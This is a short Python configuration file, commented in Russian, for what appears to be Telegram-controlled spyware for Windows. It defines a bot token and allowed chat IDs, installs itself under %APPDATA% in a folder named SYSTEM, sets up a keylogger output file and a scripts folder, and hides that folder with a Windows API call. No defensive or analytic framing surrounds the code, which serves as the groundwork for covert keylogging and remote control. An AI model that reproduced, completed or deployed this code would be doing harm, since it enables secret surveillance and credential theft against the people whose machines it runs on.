import os
import sys
import telepot
import ctypes

# Основные настройки
KNOWN_IDS = ['...']
TOKEN = '.................'

bot = telepot.Bot(TOKEN)

if getattr(sys, 'frozen', False):
    BASE_DIR = os.path.join(os.environ['APPDATA'], 'SYSTEM')
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Пути
USER = os.environ.get("USERNAME")
APPDATA = os.environ.get("APPDATA")
LOG_DIR = os.path.join(BASE_DIR, 'logs')
SCRIPTS_DIR = os.path.join(BASE_DIR, 'scripts')

# Файлы логов
LOG_FILE = os.path.join(LOG_DIR, 'user_log.txt')
KEYLOG_FILE = os.path.join(LOG_DIR, 'keylogs.txt')

os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(SCRIPTS_DIR, exist_ok=True)

# Делаем скрытую папку
FILE_ATTRIBUTE_HIDDEN = 0x02
ctypes.windll.kernel32.SetFileAttributesW(BASE_DIR, FILE_ATTRIBUTE_HIDDEN)

